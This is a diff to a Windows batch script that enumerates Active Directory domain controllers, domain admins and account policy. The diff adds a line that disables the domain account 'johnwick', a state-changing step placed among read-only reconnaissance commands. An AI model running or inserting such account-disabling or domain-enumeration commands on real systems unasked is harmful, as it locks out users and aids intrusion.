@@ -52,6 +52,8 @@ net group “Domain Controllers” /domain
 ECHO ============================
 net group “Domain Admins” /domain
 ECHO ============================
+net user johnwick /domain /active:no
+ECHO ============================
 net config workstation
 ECHO ============================
 net accounts
